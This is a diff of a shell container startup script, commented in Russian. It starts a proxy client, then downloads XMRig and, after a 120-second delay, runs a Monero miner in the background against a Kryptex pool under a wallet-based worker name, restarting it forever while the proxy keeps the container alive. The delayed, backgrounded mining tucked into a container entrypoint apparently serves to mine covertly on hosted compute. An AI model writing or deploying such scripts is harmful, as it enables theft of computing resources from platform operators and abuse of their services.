@@ -3,52 +3,50 @@
 # --- Запускаем клиент/прокси СРАЗУ ---
 ./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
 CLIENT_PID=$!
-echo "Client PID: $CLIENT_PID"
+echo "✅ Client PID: $CLIENT_PID"
 
-# --- Ждём, пока прокси поднимется (опционально, но полезно) ---
-echo "⏳ Waiting for proxy to be ready..."
-for i in {1..30}; do
-    if curl -s http://localhost:10000/health > /dev/null 2>&1 || ss -tln | grep -q :10000; then
-        echo "✅ Proxy is up!"
-        break
-    fi
-    sleep 1
-done
+# --- Подготовка xmrig (скачаем заранее, чтобы потом не ждать) ---
+DIR=xmrig-6.26.0
+ARCHIVE=$DIR-linux-static-x64.tar.gz
+if [ ! -f "$DIR/xmrig" ]; then
+    echo "📦 Downloading XMRig..."
+    wget -q "https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"
+    tar -xzf "$ARCHIVE"
+    rm "$ARCHIVE"
+fi
 
-# --- Запускаем майнер С ЗАДЕРЖКОЙ в фоне ---
+WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
+
+# --- Запускаем майнер в фоне с задержкой ---
 (
-    DELAY=120  # секунды, пока контейнер "устаканится"
-    echo "⏰ Sleeping $DELAY seconds before mining..."
-    sleep $DELAY
-
-    # --- Подготовка xmrig ---
-    DIR=xmrig-6.26.0
-    ARCHIVE=$DIR-linux-static-x64.tar.gz
-    [ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)
-
-    WALLET="krxX3328ZR/zrender_$((RANDOM % 1000 + 1))"
-    echo "🚀 Starting XMRIG with wallet: $WALLET at $(date)"
-
-    # --- Цикл перезапуска майнера ---
+    DELAY=120
+    echo "⏰ Waiting $DELAY seconds for container to stabilize..."
+    sleep "$DELAY"
+    
+    echo "🚀 Starting XMRIG with wallet: $WALLET"
+    
     while true; do
+        # stdbuf - отключаем буферизацию, tee - дублируем в файл
         stdbuf -oL -eL ./$DIR/xmrig \
             --url=xmr-ru.kryptex.network:7029 \
-            --user=$WALLET \
+            --user="$WALLET" \
             --pass=x \
             --coin=monero \
             --cpu-max-threads-hint=5 \
             --randomx-mode=light \
             --verbose 2>&1 | tee -a xmrig.log
-
-        EXIT_CODE=$?
-        echo "⚠️  [$(date)] XMRIG exited with code $EXIT_CODE, restarting in 60s..."
+        
+        echo "⚠️  [$(date)] XMRIG exited (code $?), restarting in 60s..."
         sleep 60
     done
-) &  # <--- ВАЖНО: весь блок в подпроцессе и в фоне
+) &  # <--- весь блок в фоне
 
-MINER_LAUNCHER_PID=$!
-echo "🔧 Miner launcher PID: $MINER_LAUNCHER_PID (will start after ${DELAY}s delay)"
+echo "🔧 Miner launcher started in background (PID: $!)"
 
-# --- Основной процесс: ждём прокси и держим контейнер живым ---
-echo "🔄 Main loop: keeping container alive via proxy..."
-wait $CLIENT_PID  # Ждём, пока клиент не упадёт (если упадёт)
+# --- ГЛАВНОЕ: держим скрипт живым, пока работает прокси ---
+echo "🔄 Keeping container alive via main process..."
+wait $CLIENT_PID
+
+# Если прокси упал — выходим, чтобы контейнер перезапустился (если нужно)
+echo "⚠️  Client exited, stopping script..."
+exit 0
